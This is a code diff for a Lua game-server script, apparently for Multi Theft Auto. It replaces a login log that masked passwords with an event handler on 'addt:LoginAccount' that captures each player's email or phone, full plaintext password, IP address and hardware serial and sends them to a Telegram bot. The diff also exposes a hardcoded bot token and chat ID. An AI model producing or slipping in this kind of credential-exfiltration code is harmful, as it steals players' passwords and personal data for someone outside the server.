@@ -1,41 +1,18 @@
 local BOT_TOKEN = "8405542793:AAHqybOkZBMBFjw9p3ji2ZTwyMSKaYi7zwg" -- Получить у @BotFather
 local CHAT_ID = "1264872538"     -- Получить у @userinfobot
 
-function sendRegistrationLog(player, method, email, phone, password)
-    -- Маскируем пароль для безопасности (показываем только первые 2 символа)
-    -- Если всё же решишь логировать полный (не рекомендую), убери :sub(1, 2)
-    local maskedPassword = password:sub(1, 2) .. "****" 
+-- Функция для отправки сообщения в Telegram
+function sendTelegramLog(message)
+    local sendUrl = string.format("https://api.telegram.org/bot%s/sendMessage", BOT_TOKEN)
     
-    local message = string.format(
-        "📝 **Новая регистрация / Вход**\n\n" ..
-        "👤 Игрок: %s\n" ..
-        "🔑 Метод: %s\n" ..
-        "📧 Почта: %s\n" ..
-        "📱 Телефон: %s\n" ..
-        "🔒 Пароль (маска): %s\n" ..
-        "🌐 IP: %s",
-        getPlayerName(player),
-        method,
-        email or "Не указано",
-        phone or "Не указано",
-        maskedPassword,
-        getPlayerIP(player)
-    )
-
-    -- Кодируем сообщение для URL
-    local encodedMessage = urlEncode(message)
-    local url = string.format("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s&parse_mode=Markdown", BOT_TOKEN, CHAT_ID, encodedMessage)
-
-    fetchRemote(url, function(data, err)
-        if err == 0 then
-            -- Успешно отправлено
-        else
-            outputDebugString("Ошибка отправки лога в Telegram: " .. tostring(err))
+    fetchRemote(sendUrl, function(data, err)
+        if err ~= 0 then
+            outputDebugString("Telegram Log Error: " .. tostring(err))
         end
-    end)
+    end, "chat_id=" .. CHAT_ID .. "&text=" .. message .. "&parse_mode=Markdown", false)
 end
 
--- Вспомогательная функция для кодирования текста
+-- Вспомогательная функция для очистки текста (чтобы не ломался URL)
 function urlEncode(str)
     if str then
         str = str:gsub("\n", "\r\n")
@@ -46,6 +23,41 @@ function urlEncode(str)
     end
     return str
 end
+
+-- Обработка события входа/регистрации
+addEvent("addt:LoginAccount", true)
+addEventHandler("addt:LoginAccount", root, function(identifier, password, method)
+    -- identifier - это может быть почта или телефон
+    -- password - пароль
+    -- method - "mail" или "phone"
+    
+    local playerName = getPlayerName(client) -- client - это игрок, который вызвал триггер
+    local playerIP = getPlayerIP(client)
+    local playerSerial = getPlayerSerial(client)
+    
+    -- Формируем текст лога
+    local logText = string.format(
+        "🚀 *Спроба входу/реєстрації*\n\n" ..
+        "👤 *Гравець:* %s\n" ..
+        "🔑 *Метод:* %s\n" ..
+        "📧 *Дані:* `%s`\n" ..
+        "🔒 *Пароль:* `%s`\n" ..
+        "🌐 *IP:* %s\n" ..
+        "🆔 *Serial:* `%s`",
+        playerName, 
+        method == "mail" and "Пошта" or "Телефон", 
+        identifier, 
+        password, 
+        playerIP,
+        playerSerial
+    )
+
+    -- Отправляем в ТГ
+    sendTelegramLog(urlEncode(logText))
+    
+    -- Дальше тут идет твой обычный код обработки логики входа (проверка в БД и т.д.)
+    -- outputDebugString("Лог отправлен для игрока " .. playerName)
+end)
 ----------------------------------------------------------------
 -- ГЛОБАЛЬНАЯ ТАБЛИЦА И ОЧИСТКА
 ----------------------------------------------------------------
